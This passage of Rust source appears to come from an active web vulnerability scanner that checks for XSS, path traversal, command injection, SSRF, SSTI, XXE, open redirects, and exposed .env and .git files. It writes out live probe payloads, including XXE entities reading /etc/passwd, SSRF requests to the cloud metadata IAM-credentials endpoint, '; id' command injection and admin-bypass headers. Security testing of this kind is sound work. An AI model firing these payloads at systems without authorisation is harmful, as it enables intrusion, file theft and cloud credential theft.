                                    evidence: Some(format!("Payload reflected unencoded in {} context | Status: {} | Content-Type: {} | Response: {} bytes | Time: {}ms", context, status, ct, xss_body.len(), elapsed)),
                                    detail: format!("Parameter '{}' reflects user input in {} context without proper encoding.\n\nPayload: {}\nReflection context: {}\nContent-Type: {}\n\nAn attacker can inject arbitrary JavaScript to steal cookies, redirect users, or perform actions on their behalf.",
                                        param_name, context, payload, context, ct),
                                    remediation: "1. HTML-encode output in HTML context\n2. JavaScript-encode in JS context\n3. URL-encode in URL context\n4. Implement Content-Security-Policy\n5. Use HttpOnly cookies".into(),
                                    request_info: Some(RequestLog {
                                        method: "GET".into(), url: xss_url,
                                        request_headers: vec![format!("XSS payload in param '{}'", param_name)],
                                        request_body: None, response_status: status,
                                        response_headers: hdrs, response_body_preview: xss_body.chars().take(500).collect(),
                                        response_time_ms: elapsed, response_size: xss_body.len(),
                                    }),
                                });
                                break;
                            }
                        }
                    }
                }
            }
        }
    }

    flush_live(
        &live,
        "scanning path traversal",
        60.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_path_traversal {
        for (param_url, param_name, _) in &all_params {
            if total_requests >= config.max_requests {
                break;
            }
            for (payload, signature) in PATH_TRAVERSAL_PAYLOADS {
                if total_requests >= config.max_requests {
                    break;
                }
                let pt_url = inject_param(param_url, param_name, payload);
                let req_start = std::time::Instant::now();
                if let Ok(resp) = client.get(&pt_url).send().await {
                    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                    let status = resp.status().as_u16();
                    let body = resp.text().await.unwrap_or_default();
                    let elapsed = req_start.elapsed().as_millis() as u64;
                    if body.contains(signature) {
                        findings.push(ScanFinding {
                            id: uuid::Uuid::new_v4().to_string(),
                            finding_type: "path_traversal".into(),
                            name: "Path Traversal / Local File Inclusion (LFI)".into(),
                            severity: "critical".into(), confidence: "certain".into(),
                            url: pt_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: Some(format!("File content '{}' found in response | Status: {} | Response size: {} | Time: {}ms", signature, status, body.len(), elapsed)),
                            detail: format!("Parameter '{}' allows reading arbitrary files from the server.\n\nPayload: {}\nFile signature detected: '{}'\n\nThis is a critical vulnerability allowing attackers to read sensitive files like /etc/passwd, configuration files, source code, and potentially achieve Remote Code Execution via log poisoning.", param_name, payload, signature),
                            remediation: "1. Never use user input in file path operations\n2. Use a whitelist of allowed files\n3. Chroot file access\n4. Remove directory traversal characters".into(),
                            request_info: Some(RequestLog {
                                method: "GET".into(), url: pt_url,
                                request_headers: vec![], request_body: None,
                                response_status: status, response_headers: vec![],
                                response_body_preview: body.chars().take(500).collect(),
                                response_time_ms: elapsed, response_size: body.len(),
                            }),
                        });
                        break;
                    }
                }
            }
        }
    }

    flush_live(
        &live,
        "scanning cmdi",
        68.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_command_injection {
        for (param_url, param_name, param_value) in &all_params {
            if total_requests >= config.max_requests {
                break;
            }
            for (payload, signature) in CMD_INJECTION_PAYLOADS {
                if total_requests >= config.max_requests {
                    break;
                }
                let cmd_url = inject_param(param_url, param_name, &format!("{}{}", param_value, payload));
                if let Ok(resp) = client.get(&cmd_url).send().await {
                    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(signature) && !baseline_body.contains(signature) {
                        findings.push(ScanFinding {
                            id: uuid::Uuid::new_v4().to_string(),
                            finding_type: "command_injection".into(),
                            name: "OS Command Injection".into(),
                            severity: "critical".into(), confidence: "firm".into(),
                            url: cmd_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: Some(format!("Command output '{}' detected in response (not in baseline)", signature)),
                            detail: format!("Parameter '{}' is vulnerable to OS command injection.\n\nPayload: {}\nSignature found: '{}'\n\nThis allows full server compromise — arbitrary command execution.",
                                param_name, payload, signature),
                            remediation: "Never pass user input to system commands. Use parameterized APIs.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
    }

    flush_live(
        &live,
        "scanning ssrf",
        75.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_ssrf {
        for (param_url, param_name, _) in &all_params {
            if total_requests >= config.max_requests {
                break;
            }
            let ssrf_payloads = [
                "http://127.0.0.1:80",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
                "http://0x7f000001",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ];
            for payload in &ssrf_payloads {
                if total_requests >= config.max_requests {
                    break;
                }
                let ssrf_url = inject_param(param_url, param_name, payload);
                if let Ok(resp) = client.get(&ssrf_url).send().await {
                    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                    let status_ok = resp.status().is_success();
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains("ami-id")
                        || body.contains("instance-id")
                        || body.contains("local-ipv4")
                        || body.contains("AccessKeyId")
                        || body.contains("SecretAccessKey")
                        || (body.len() > 100 && status_ok && body.len() != baseline_len)
                    {
                        findings.push(ScanFinding {
                            id: uuid::Uuid::new_v4().to_string(),
                            finding_type: "ssrf".into(),
                            name: "Server-Side Request Forgery (SSRF)".into(),
                            severity: "high".into(), confidence: "tentative".into(),
                            url: ssrf_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: Some(format!("Internal URL response: {} bytes (baseline: {} bytes) | Target: {}", body.len(), baseline_len, payload)),
                            detail: format!("Parameter '{}' may allow SSRF.\n\nPayload: {}\nResponse size: {} bytes (baseline: {} bytes)\n\nThis could allow accessing internal services, cloud metadata, and bypassing firewalls.",
                                param_name, payload, body.len(), baseline_len),
                            remediation: "1. Validate and sanitize URLs\n2. Block internal/private IP ranges\n3. Use URL allowlists\n4. Disable unnecessary protocols".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
    }

    flush_live(
        &live,
        "scanning ssti",
        82.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_ssti {
        for (param_url, param_name, _) in &all_params {
            if total_requests >= config.max_requests {
                break;
            }
            for (payload, expected) in SSTI_PAYLOADS {
                if total_requests >= config.max_requests {
                    break;
                }
                let ssti_url = inject_param(param_url, param_name, payload);
                if let Ok(resp) = client.get(&ssti_url).send().await {
                    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(expected) && !baseline_body.contains(expected) {
                        findings.push(ScanFinding {
                            id: uuid::Uuid::new_v4().to_string(),
                            finding_type: "ssti".into(),
                            name: "Server-Side Template Injection (SSTI)".into(),
                            severity: "critical".into(),
                            confidence: if *expected == "49" { "firm" } else { "certain" }.into(),
                            url: ssti_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: Some(format!("Template evaluation result '{}' found in response (not in baseline)", expected)),
                            detail: format!("Parameter '{}' is vulnerable to SSTI.\n\nPayload: {}\nEvaluated to: '{}'\n\nThis can lead to Remote Code Execution.",
                                param_name, payload, expected),
                            remediation: "Never pass user input into template engines directly.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
    }

    flush_live(
        &live,
        "scanning xxe",
        88.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_xxe {
        for (payload, content_type, signature) in XXE_PAYLOADS {
            if total_requests >= config.max_requests {
                break;
            }
            if let Ok(resp) = client
                .post(target)
                .header("Content-Type", *content_type)
                .body(payload.to_string())
                .send()
                .await
            {
                bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                let body = resp.text().await.unwrap_or_default();
                if body.contains(signature) {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: "xxe".into(),
                        name: "XML External Entity Injection (XXE)".into(),
                        severity: "critical".into(), confidence: "certain".into(),
                        url: target.into(), parameter: Some("XML body".into()),
                        payload: Some(payload.to_string()),
                        evidence: Some(format!("File access signature '{}' in response", signature)),
                        detail: format!("The server's XML parser processes external entities.\n\nPayload: {}\nFile content detected: '{}'\n\nThis allows arbitrary file read and SSRF.", payload, signature),
                        remediation: "Disable DTD processing and external entity resolution.".into(),
                        request_info: None,
                    });
                    break;
                }
            }
        }
    }

    flush_live(
        &live,
        "scanning open redirect",
        92.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_open_redirect {
        let redirect_params = [
            "redirect",
            "url",
            "next",
            "return",
            "returnTo",
            "return_url",
            "redirect_uri",
            "callback",
            "goto",
            "dest",
        ];
        for param_name in &redirect_params {
            let exists = all_params.iter().any(|(_, p, _)| p == *param_name);
            if !exists {
                continue;
            }
            for payload in OPEN_REDIRECT_PAYLOADS {
                if total_requests >= config.max_requests {
                    break;
                }
                let redirect_url = inject_param(target, param_name, payload);
                if let Ok(resp) = reqwest::Client::builder()
                    .danger_accept_invalid_certs(true)
                    .redirect(reqwest::redirect::Policy::none())
                    .build()
                    .unwrap_or_default()
                    .get(&redirect_url)
                    .send()
                    .await
                {
                    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                    let status = resp.status().as_u16();
                    let location = resp.headers().get("location").and_then(|v| v.to_str().ok()).unwrap_or("");
                    if status >= 300
                        && status < 400
                        && (location.contains("evil.com") || location.contains(payload))
                    {
                        findings.push(ScanFinding {
                            id: uuid::Uuid::new_v4().to_string(),
                            finding_type: "open_redirect".into(),
                            name: "Open Redirect".into(),
                            severity: "medium".into(), confidence: "certain".into(),
                            url: redirect_url.clone(),
                            parameter: Some(param_name.to_string()),
                            payload: Some(payload.to_string()),
                            evidence: Some(format!("Status: {} → Location: {}", status, location)),
                            detail: format!("Parameter '{}' redirects to attacker-controlled URL.\n\nPayload: {}\nRedirect target: {}",
                                param_name, payload, location),
                            remediation: "Validate redirect URLs against an allowlist.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
    }

    if baseline_headers.get("content-type").map(|v| v.contains("json")).unwrap_or(false)
        || baseline_body.trim_start().starts_with('{')
    {
        let json_injection_payloads: Vec<(&str, &str, &str, &str)> = vec![
            ("' OR '1'='1", "sqli", "SQL Injection in JSON Body", "high"),
            ("\" OR \"1\"=\"1", "sqli", "SQL Injection in JSON Body", "high"),
            ("<script>alert('WS_JSON')</script>", "xss", "XSS in JSON Body", "high"),
            ("{{7*7}}", "ssti", "SSTI in JSON Body", "critical"),
            ("../../../etc/passwd", "path_traversal", "Path Traversal in JSON Body", "critical"),
            ("; id", "command_injection", "Command Injection in JSON Body", "critical"),
        ];

        if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(&baseline_body) {
            if let Some(obj) = json_val.as_object() {
                for (json_key, json_value) in obj {
                    if !json_value.is_string() && !json_value.is_number() {
                        continue;
                    }
                    if total_requests >= config.max_requests {
                        break;
                    }

                    injection_points.push(InjectionPoint {
                        url: target.to_string(),
                        param_name: json_key.clone(),
                        param_type: "json_body".into(),
                        original_value: json_value.to_string(),
                    });

                    for (payload, ftype, fname, sev) in &json_injection_payloads {
                        if total_requests >= config.max_requests {
                            break;
                        }
                        let mut injected = obj.clone();
                        injected.insert(json_key.clone(), serde_json::Value::String(payload.to_string()));
                        let injected_body = serde_json::to_string(&injected).unwrap_or_default();

                        let req_start = std::time::Instant::now();
                        if let Ok(resp) = client
                            .post(target)
                            .header("Content-Type", "application/json")
                            .body(injected_body.clone())
                            .send()
                            .await
                        {
                            bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                            let status = resp.status().as_u16();
                            let hdrs: Vec<String> = resp
                                .headers()
                                .iter()
                                .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
                                .collect();
                            let body = resp.text().await.unwrap_or_default();
                            let elapsed = req_start.elapsed().as_millis() as u64;
                            let body_lower = body.to_lowercase();

                            let mut found = false;
                            if *ftype == "sqli" {
                                for sig in SQLI_ERROR_SIGNATURES {
                                    if body_lower.contains(sig) {
                                        found = true;
                                        findings.push(ScanFinding {
                                            id: uuid::Uuid::new_v4().to_string(),
                                            finding_type: ftype.to_string(),
                                            name: fname.to_string(),
                                            severity: sev.to_string(), confidence: "firm".into(),
                                            url: target.into(),
                                            parameter: Some(format!("JSON body → $.{}", json_key)),
                                            payload: Some(payload.to_string()),
                                            evidence: Some(format!("DB error '{}' in response | Status: {} | Time: {}ms", sig, status, elapsed)),
                                            detail: format!("JSON body field '{}' is vulnerable to SQL injection.\n\nRequest body:\n{}\n\nDB error: '{}'", json_key, injected_body, sig),
                                            remediation: "Use parameterized queries. Never concatenate JSON input into SQL.".into(),
                                            request_info: Some(RequestLog {
                                                method: "POST".into(), url: target.into(),
                                                request_headers: vec!["Content-Type: application/json".into()],
                                                request_body: Some(injected_body.clone()),
                                                response_status: status, response_headers: hdrs.clone(),
                                                response_body_preview: body.chars().take(500).collect(),
                                                response_time_ms: elapsed, response_size: body.len(),
                                            }),
                                        });
                                        break;
                                    }
                                }
                            }
                            if *ftype == "xss" && !found && body.contains(payload) {
                                found = true;
                                findings.push(ScanFinding {
                                    id: uuid::Uuid::new_v4().to_string(),
                                    finding_type: ftype.to_string(),
                                    name: fname.to_string(),
                                    severity: sev.to_string(),
                                    confidence: "firm".into(),
                                    url: target.into(),
                                    parameter: Some(format!("JSON body → $.{}", json_key)),
                                    payload: Some(payload.to_string()),
                                    evidence: Some(format!(
                                        "Payload reflected unencoded | Status: {} | Time: {}ms",
                                        status, elapsed
                                    )),
                                    detail: format!(
                                        "JSON body field '{}' reflects XSS payload without encoding.",
                                        json_key
                                    ),
                                    remediation: "HTML-encode all output from JSON body parameters.".into(),
                                    request_info: Some(RequestLog {
                                        method: "POST".into(),
                                        url: target.into(),
                                        request_headers: vec!["Content-Type: application/json".into()],
                                        request_body: Some(injected_body.clone()),
                                        response_status: status,
                                        response_headers: hdrs.clone(),
                                        response_body_preview: body.chars().take(500).collect(),
                                        response_time_ms: elapsed,
                                        response_size: body.len(),
                                    }),
                                });
                            }
                            if *ftype == "ssti"
                                && !found
                                && body.contains("49")
                                && !baseline_body.contains("49")
                            {
                                findings.push(ScanFinding {
                                    id: uuid::Uuid::new_v4().to_string(),
                                    finding_type: ftype.to_string(),
                                    name: fname.to_string(),
                                    severity: sev.to_string(), confidence: "firm".into(),
                                    url: target.into(),
                                    parameter: Some(format!("JSON body → $.{}", json_key)),
                                    payload: Some(payload.to_string()),
                                    evidence: Some(format!("Template evaluated '49' in response")),
                                    detail: format!("JSON field '{}' is vulnerable to SSTI. Template expression {{{{7*7}}}} evaluated.", json_key),
                                    remediation: "Never pass user input into template engines.".into(),
                                    request_info: None,
                                });
                            }
                            if (*ftype == "path_traversal"
                                && body.contains("root:")
                                && !baseline_body.contains("root:"))
                                || (*ftype == "command_injection"
                                    && body.contains("uid=")
                                    && !baseline_body.contains("uid="))
                            {
                                findings.push(ScanFinding {
                                    id: uuid::Uuid::new_v4().to_string(),
                                    finding_type: ftype.to_string(),
                                    name: fname.to_string(),
                                    severity: sev.to_string(),
                                    confidence: "firm".into(),
                                    url: target.into(),
                                    parameter: Some(format!("JSON body → $.{}", json_key)),
                                    payload: Some(payload.to_string()),
                                    evidence: Some(format!(
                                        "OS output detected in response | Status: {}",
                                        status
                                    )),
                                    detail: format!(
                                        "JSON field '{}' is vulnerable. Payload: {}",
                                        json_key, payload
                                    ),
                                    remediation: "Validate and sanitize all JSON body input.".into(),
                                    request_info: None,
                                });
                            }

                            if found {
                                break;
                            } // Move to next field
                        }
                    }
                }
            }
        }
    }

    let injectable_headers: Vec<(&str, Vec<(&str, &str, &str)>)> = vec![
        (
            "User-Agent",
            vec![
                ("' OR '1'='1'--", "sqli", "SQL Injection via User-Agent"),
                ("<script>alert('UA')</script>", "xss", "XSS via User-Agent"),
            ],
        ),
        (
            "Referer",
            vec![
                ("' OR '1'='1'--", "sqli", "SQL Injection via Referer"),
                ("<script>alert('REF')</script>", "xss", "XSS via Referer"),
            ],
        ),
        (
            "X-Forwarded-For",
            vec![
                ("' OR '1'='1'--", "sqli", "SQL Injection via X-Forwarded-For"),
                ("127.0.0.1", "info_disclosure", "X-Forwarded-For IP Spoofing"),
                ("{{7*7}}", "ssti", "SSTI via X-Forwarded-For"),
            ],
        ),
        ("X-Forwarded-Host", vec![("evil.com", "ssrf", "Host Header Injection via X-Forwarded-Host")]),
        ("X-Original-URL", vec![("/admin", "path_traversal", "Auth Bypass via X-Original-URL")]),
        ("X-Rewrite-URL", vec![("/admin", "path_traversal", "Auth Bypass via X-Rewrite-URL")]),
    ];

    for (header_name, payloads) in &injectable_headers {
        if total_requests >= config.max_requests {
            break;
        }
        for (payload, ftype, fname) in payloads {
            if total_requests >= config.max_requests {
                break;
            }
            let req_start = std::time::Instant::now();
            if let Ok(resp) = client.get(target).header(*header_name, *payload).send().await {
                bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let elapsed = req_start.elapsed().as_millis() as u64;
                let body_lower = body.to_lowercase();

                let mut detected = false;
                if *ftype == "sqli" {
                    for sig in SQLI_ERROR_SIGNATURES {
                        if body_lower.contains(sig) {
                            detected = true;
                            findings.push(ScanFinding {
                                id: uuid::Uuid::new_v4().to_string(),
                                finding_type: ftype.to_string(),
                                name: fname.to_string(),
                                severity: "high".into(), confidence: "firm".into(),
                                url: target.into(),
                                parameter: Some(format!("Header: {}", header_name)),
                                payload: Some(payload.to_string()),
                                evidence: Some(format!("DB error '{}' when injecting into {} header | Status: {} | Time: {}ms", sig, header_name, status, elapsed)),
                                detail: format!("The '{}' header is logged/processed by a backend that is vulnerable to SQL injection.\n\nHeader: {}: {}\nDB error: '{}'", header_name, header_name, payload, sig),
                                remediation: "Parameterize all database queries including those using HTTP header values.".into(),
                                request_info: Some(RequestLog {
                                    method: "GET".into(), url: target.into(),
                                    request_headers: vec![format!("{}: {}", header_name, payload)],
                                    request_body: None, response_status: status,
                                    response_headers: vec![],
                                    response_body_preview: body.chars().take(500).collect(),
                                    response_time_ms: elapsed, response_size: body.len(),
                                }),
                            });
                            break;
                        }
                    }
                }
                if *ftype == "xss" && !detected && body.contains(payload) {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: ftype.to_string(),
                        name: fname.to_string(),
                        severity: "medium".into(),
                        confidence: "firm".into(),
                        url: target.into(),
                        parameter: Some(format!("Header: {}", header_name)),
                        payload: Some(payload.to_string()),
                        evidence: Some(format!(
                            "Payload reflected from {} header | Status: {}",
                            header_name, status
                        )),
                        detail: format!(
                            "The '{}' header value is reflected in the response without encoding.",
                            header_name
                        ),
                        remediation: "HTML-encode all output including header values.".into(),
                        request_info: None,
                    });
                }
                if *ftype == "ssti" && !detected && body.contains("49") && !baseline_body.contains("49") {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: ftype.to_string(),
                        name: fname.to_string(),
                        severity: "critical".into(),
                        confidence: "firm".into(),
                        url: target.into(),
                        parameter: Some(format!("Header: {}", header_name)),
                        payload: Some(payload.to_string()),
                        evidence: Some(format!("SSTI expression evaluated via {} header", header_name)),
                        detail: format!(
                            "The '{}' header value is processed by a template engine.",
                            header_name
                        ),
                        remediation: "Never pass header values into template engines.".into(),
                        request_info: None,
                    });
                }
                if (*header_name == "X-Original-URL" || *header_name == "X-Rewrite-URL")
                    && status == 200
                    && body.len() != baseline_len
                    && (body_lower.contains("admin")
                        || body_lower.contains("dashboard")
                        || body_lower.contains("manage"))
                {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: "path_traversal".into(),
                        name: format!("Authentication Bypass via {}", header_name),
                        severity: "critical".into(), confidence: "tentative".into(),
                        url: target.into(),
                        parameter: Some(format!("Header: {}", header_name)),
                        payload: Some(format!("{}: /admin", header_name)),
                        evidence: Some(format!("Status: {} | Response size differs: {} vs baseline {} | May contain admin content", status, body.len(), baseline_len)),
                        detail: format!("The {} header may allow bypassing URL-based authentication by overriding the request path.", header_name),
                        remediation: "Block X-Original-URL and X-Rewrite-URL headers at the reverse proxy level.".into(),
                        request_info: None,
                    });
                }
            }
        }

        injection_points.push(InjectionPoint {
            url: target.to_string(),
            param_name: header_name.to_string(),
            param_type: "header".into(),
            original_value: "".into(),
        });
    }

    if let Some(set_cookie) = baseline_headers.get("set-cookie") {
        let cookie_parts: Vec<&str> = set_cookie.split(';').collect();
        if let Some(main_cookie) = cookie_parts.first() {
            let kv: Vec<&str> = main_cookie.splitn(2, '=').collect();
            if kv.len() == 2 {
                let cookie_name = kv[0].trim();
                let cookie_value = kv[1].trim();

                injection_points.push(InjectionPoint {
                    url: target.to_string(),
                    param_name: cookie_name.to_string(),
                    param_type: "cookie".into(),
                    original_value: cookie_value.to_string(),
                });

                let cookie_payloads: Vec<(&str, &str, &str)> = vec![
                    ("' OR '1'='1'--", "sqli", "SQL Injection via Cookie"),
                    ("<script>alert('CK')</script>", "xss", "XSS via Cookie"),
                    ("../../../etc/passwd", "path_traversal", "Path Traversal via Cookie"),
                    ("{{7*7}}", "ssti", "SSTI via Cookie"),
                ];

                for (payload, ftype, fname) in &cookie_payloads {
                    if total_requests >= config.max_requests {
                        break;
                    }
                    let cookie_header = format!("{}={}", cookie_name, payload);
                    let req_start = std::time::Instant::now();
                    if let Ok(resp) = client.get(target).header("Cookie", &cookie_header).send().await {
                        bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                        let status = resp.status().as_u16();
                        let body = resp.text().await.unwrap_or_default();
                        let elapsed = req_start.elapsed().as_millis() as u64;
                        let body_lower = body.to_lowercase();

                        if *ftype == "sqli" {
                            for sig in SQLI_ERROR_SIGNATURES {
                                if body_lower.contains(sig) {
                                    findings.push(ScanFinding {
                                        id: uuid::Uuid::new_v4().to_string(),
                                        finding_type: ftype.to_string(),
                                        name: fname.to_string(),
                                        severity: "high".into(), confidence: "firm".into(),
                                        url: target.into(),
                                        parameter: Some(format!("Cookie: {}", cookie_name)),
                                        payload: Some(payload.to_string()),
                                        evidence: Some(format!("DB error '{}' via cookie injection | Status: {} | Time: {}ms", sig, status, elapsed)),
                                        detail: format!("Cookie '{}' is processed in a SQL query.\n\nCookie: {}\nDB error: '{}'", cookie_name, cookie_header, sig),
                                        remediation: "Never use cookie values directly in SQL queries.".into(),
                                        request_info: Some(RequestLog {
                                            method: "GET".into(), url: target.into(),
                                            request_headers: vec![format!("Cookie: {}", cookie_header)],
                                            request_body: None, response_status: status,
                                            response_headers: vec![],
                                            response_body_preview: body.chars().take(500).collect(),
                                            response_time_ms: elapsed, response_size: body.len(),
                                        }),
                                    });
                                    break;
                                }
                            }
                        }
                        if *ftype == "xss" && body.contains(payload) {
                            findings.push(ScanFinding {
                                id: uuid::Uuid::new_v4().to_string(),
                                finding_type: ftype.to_string(),
                                name: fname.to_string(),
                                severity: "medium".into(),
                                confidence: "firm".into(),
                                url: target.into(),
                                parameter: Some(format!("Cookie: {}", cookie_name)),
                                payload: Some(payload.to_string()),
                                evidence: Some(format!(
                                    "Cookie value reflected unencoded | Status: {}",
                                    status
                                )),
                                detail: format!(
                                    "Cookie '{}' value is reflected in the response without encoding.",
                                    cookie_name
                                ),
                                remediation: "HTML-encode all output including cookie values.".into(),
                                request_info: None,
                            });
                        }
                    }
                }
            }
        }
    }

    if baseline_body.trim_start().starts_with("<?xml")
        || baseline_body.trim_start().starts_with("<")
        || baseline_headers.get("content-type").map(|v| v.contains("xml")).unwrap_or(false)
    {
        let xml_injection_payloads: Vec<(&str, &str, &str, &str, &str)> = vec![
            ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
             "application/xml", "root:", "xxe", "XXE via XML Body"),
            ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
             "application/xml", "[fonts]", "xxe", "XXE via XML Body (Windows)"),
            ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
             "application/xml", "ami-id", "ssrf", "SSRF via XXE"),
        ];

        for (payload, ct, signature, ftype, fname) in &xml_injection_payloads {
            if total_requests >= config.max_requests {
                break;
            }
            let req_start = std::time::Instant::now();
            if let Ok(resp) =
                client.post(target).header("Content-Type", *ct).body(payload.to_string()).send().await
            {
                bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let elapsed = req_start.elapsed().as_millis() as u64;
                if body.contains(signature) {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: ftype.to_string(),
                        name: fname.to_string(),
                        severity: "critical".into(),
                        confidence: "certain".into(),
                        url: target.into(),
                        parameter: Some("XML body".into()),
                        payload: Some(payload.to_string()),
                        evidence: Some(format!(
                            "Signature '{}' in response | Status: {} | Time: {}ms",
                            signature, status, elapsed
                        )),
                        detail: format!(
                            "XML parser processes external entities.\n\nPayload:\n{}\n\nFile content: '{}'",
                            payload, signature
                        ),
                        remediation: "Disable DTD processing and external entity resolution in XML parser."
                            .into(),
                        request_info: Some(RequestLog {
                            method: "POST".into(),
                            url: target.into(),
                            request_headers: vec![format!("Content-Type: {}", ct)],
                            request_body: Some(payload.to_string()),
                            response_status: status,
                            response_headers: vec![],
                            response_body_preview: body.chars().take(500).collect(),
                            response_time_ms: elapsed,
                            response_size: body.len(),
                        }),
                    });
                    break;
                }
            }
        }
    }

    let error_paths = [
        "/.env",
        "/.git/HEAD",
        "/wp-config.php.bak",
        "/server-status",
        "/elmah.axd",
        "/trace.axd",
        "/debug/default/view",
        "/api",
        "/api/v1",
        "/graphql",
        "/swagger.json",
        "/robots.txt",
        "/sitemap.xml",
        "/.well-known/security.txt",
        "/admin",
        "/login",
        "/wp-admin",
        "/phpmyadmin",
    ];

    let base = target.trim_end_matches('/');
    for path in &error_paths {
        if total_requests >= config.max_requests {
            break;
        }
        let test_url = format!("{}{}", base, path);
        if let Ok(resp) = client.get(&test_url).send().await {
            bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
            let status = resp.status().as_u16();
            let ct =
                resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
            let body = resp.text().await.unwrap_or_default();

            if status == 200 || status == 301 || status == 302 {
                if *path == "/.env"
                    && (body.contains("DB_")
                        || body.contains("SECRET")
                        || body.contains("API_KEY")
                        || body.contains("PASSWORD"))
                {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: "info_disclosure".into(),
                        name: "Environment File Exposed (.env)".into(),
                        severity: "critical".into(), confidence: "certain".into(),
                        url: test_url.clone(), parameter: None, payload: None,
                        evidence: Some(format!("Status: {} | Size: {} bytes | Contains sensitive variables", status, body.len())),
                        detail: format!("The .env file is publicly accessible at {}\n\nThis file typically contains database credentials, API keys, and other secrets.", test_url),
                        remediation: "Block access to .env files in web server configuration.".into(),
                        request_info: None,
                    });
                } else if *path == "/.git/HEAD" && body.starts_with("ref:") {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: "info_disclosure".into(),
                        name: "Git Repository Exposed".into(),
                        severity: "high".into(),
                        confidence: "certain".into(),
                        url: test_url.clone(),
                        parameter: None,
                        payload: None,
                        evidence: Some(format!("Git HEAD: {}", body.trim())),
                        detail: format!(
                            "The .git directory is publicly accessible. Source code can be fully downloaded."
                        ),
                        remediation: "Block access to .git directory.".into(),
                        request_info: None,
                    });
                } else if (*path == "/swagger.json" || *path == "/api") && ct.contains("json") {
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: "info_disclosure".into(),
                        name: "API Documentation Exposed".into(),
                        severity: "low".into(),
                        confidence: "certain".into(),
                        url: test_url.clone(),
                        parameter: None,
                        payload: None,
                        evidence: Some(format!(
                            "Status: {} | Content-Type: {} | Size: {}",
                            status,
                            ct,
                            body.len()
                        )),
                        detail: format!("API documentation is publicly accessible at {}", test_url),
                        remediation: "Restrict API documentation to authenticated users.".into(),
                        request_info: None,
                    });
                }
            }
        }
    }

    let severity_order = |s: &str| match s {
        "critical" => 0,
        "high" => 1,
        "medium" => 2,
        "low" => 3,
        _ => 4,
    };
    findings.sort_by(|a, b| severity_order(&a.severity).cmp(&severity_order(&b.severity)));

    flush_live(
        &live,
        "finalising",
        99.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );

    Ok(())
}

fn passive_header_scan(
    url: &str,
    headers: &HashMap<String, String>,
    body: &str,
    findings: &mut Vec<ScanFinding>,
) {
    let checks: Vec<(&str, &str, &str, &str)> = vec![
        (
            "x-frame-options",
            "Missing X-Frame-Options Header",
            "medium",
            "Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' to prevent clickjacking attacks.",
        ),
        (
            "content-security-policy",
            "Missing Content-Security-Policy Header",
            "medium",
            "Implement a strict CSP. Example: default-src 'self'; script-src 'self'",
        ),
        (
            "strict-transport-security",
            "Missing Strict-Transport-Security (HSTS)",
            "low",
